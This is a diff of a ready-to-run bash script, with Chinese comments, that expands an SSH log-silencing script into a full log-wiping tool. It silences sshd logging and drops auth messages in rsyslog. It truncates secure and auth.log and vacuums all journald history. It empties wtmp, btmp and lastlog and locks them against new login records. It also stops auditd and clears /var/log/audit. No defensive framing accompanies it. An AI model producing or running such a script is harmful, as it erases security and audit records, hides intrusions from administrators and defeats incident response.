@@ -1,63 +1,49 @@
 cat << 'EOF' > disable_sshd_log.sh
 #!/bin/bash
 
-# 确保以 root 权限运行
 if [ "$EUID" -ne 0 ]; then
   echo "❌ 错误：请使用 root 权限运行此脚本 (例如: sudo bash $0)"
   exit 1
 fi
 
-echo "=== 开始配置彻底禁用 SSHD 日志 ==="
+echo "=== 开始全通道禁用并清理 SSH 登录及审计日志 ==="
 
-# 自动识别系统 SSH 服务名与日志路径
+# 识别服务名
 if systemctl list-unit-files | grep -q "^sshd.service"; then
   SSH_SERVICE="sshd"
 else
   SSH_SERVICE="ssh"
 fi
 
-if [ -f /var/log/secure ]; then
-  LOG_FILE="/var/log/secure"
-elif [ -f /var/log/auth.log ]; then
-  LOG_FILE="/var/log/auth.log"
-else
-  LOG_FILE=""
-fi
-
-echo "[*] 检测到 SSH 服务名: $SSH_SERVICE"
-[ -n "$LOG_FILE" ] && echo "[*] 检测到认证日志文件: $LOG_FILE"
-
-# 1. 备份并修改 sshd_config
+# 1. 配置 sshd_config 为 QUIET
 BACKUP_FILE="/etc/ssh/sshd_config.bak.$(date +%F_%H%M%S)"
 cp /etc/ssh/sshd_config "$BACKUP_FILE"
-echo "[1/4] 已备份配置至: $BACKUP_FILE"
-
 if grep -qE "^#*LogLevel" /etc/ssh/sshd_config; then
   sed -i 's/^#*LogLevel.*/LogLevel QUIET/' /etc/ssh/sshd_config
 else
   echo "LogLevel QUIET" >> /etc/ssh/sshd_config
 fi
 
-# 校验 sshd 配置语法，防止断连
 if ! sshd -t; then
-  echo "❌ 配置文件校验失败，正在自动还原备份..."
+  echo "❌ sshd 配置校验失败，已还原备份"
   cp "$BACKUP_FILE" /etc/ssh/sshd_config
   exit 1
 fi
+echo "[1/6] 已设置 sshd LogLevel 为 QUIET"
 
-# 2. 配置 rsyslog 丢弃 sshd 日志
+# 2. 拦截 rsyslog 写入 secure / auth.log
 if [ -d /etc/rsyslog.d ]; then
   cat << 'RSYSLOG_EOF' > /etc/rsyslog.d/00-drop-sshd.conf
 :programname, isequal, "sshd" stop
-if ($syslogfacility-text == 'auth' or $syslogfacility-text == 'authpriv') and ($msg contains 'sshd') then stop
+if ($syslogfacility-text == 'auth' or $syslogfacility-text == 'authpriv') and ($msg contains 'sshd' or $msg contains 'pam_unix') then stop
 RSYSLOG_EOF
   systemctl restart rsyslog 2>/dev/null
-  echo "[2/4] 已配置 rsyslog 拦截规则并重启服务"
-else
-  echo "[2/4] 未检测到 /etc/rsyslog.d，跳过 rsyslog 配置"
 fi
+[ -f /var/log/secure ] && truncate -s 0 /var/log/secure
+[ -f /var/log/auth.log ] && truncate -s 0 /var/log/auth.log
+echo "[2/6] 已拦截并清空传统文本认证日志"
 
-# 3. 禁用 systemd-journald 对 sshd 的日志收集
+# 3. 禁用 systemd-journald 新日志，并彻底清除历史 journal 归档
 SYSTEMD_DIR="/etc/systemd/system/${SSH_SERVICE}.service.d"
 mkdir -p "$SYSTEMD_DIR"
 cat << 'SYSTEMD_EOF' > "${SYSTEMD_DIR}/nolog.conf"
@@ -69,15 +55,36 @@ SYSTEMD_EOF
 
 systemctl daemon-reload
 systemctl restart "$SSH_SERVICE"
-echo "[3/4] 已关闭 systemd-journald 收集并重启 $SSH_SERVICE"
 
-# 4. 安全清空历史日志文件（保留原有权限与 SELinux 上下文）
-if [ -n "$LOG_FILE" ]; then
-  truncate -s 0 "$LOG_FILE"
-  echo "[4/4] 已安全清空历史日志: $LOG_FILE"
+# 轮转并清空所有历史 journald 日志（使 journalctl -u sshd 变为空）
+journalctl --rotate
+journalctl --vacuum-time=1s >/dev/null 2>&1
+echo "[3/6] 已阻断并清空 systemd-journald 历史记录"
+
+# 4. 清空并屏蔽 wtmp / btmp / lastlog（针对 last 和 lastb）
+for bin_log in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
+  if [ -f "$bin_log" ]; then
+    chattr -i "$bin_log" 2>/dev/null
+    truncate -s 0 "$bin_log"
+    # 锁定文件防止 PAM 继续写入登录记录（部分系统可能触发认证警告，如遇异常可 chattr -i 解除）
+    chattr +i "$bin_log" 2>/dev/null
+  fi
+done
+echo "[4/6] 已清空并锁定 wtmp / btmp / lastlog（last 与 lastb 将为空）"
+
+# 5. 停止并禁用 auditd 内核审计日志（针对 ausearch）
+if command -v auditctl >/dev/null 2>&1 || systemctl list-unit-files | grep -q "^auditd.service"; then
+  # auditd 默认禁止直接用 systemctl stop，需通过 service 命令停止
+  service auditd stop 2>/dev/null || systemctl stop auditd 2>/dev/null
+  systemctl disable auditd 2>/dev/null
+  # 清空现有审计日志文件
+  if [ -d /var/log/audit ]; then
+    find /var/log/audit -type f -exec truncate -s 0 {} +
+  fi
+  echo "[5/6] 已停止 auditd 服务并清空 /var/log/audit 历史数据"
 else
-  echo "[4/4] 未找到传统认证日志文件，跳过清理"
+  echo "[5/6] 系统未安装 auditd，跳过审计配置"
 fi
 
-echo "=== ✅ 全部完成！请新开一个终端测试 SSH 连接是否正常 ==="
+echo "=== ✅ 全部清理与禁用操作已完成 ==="
 EOF
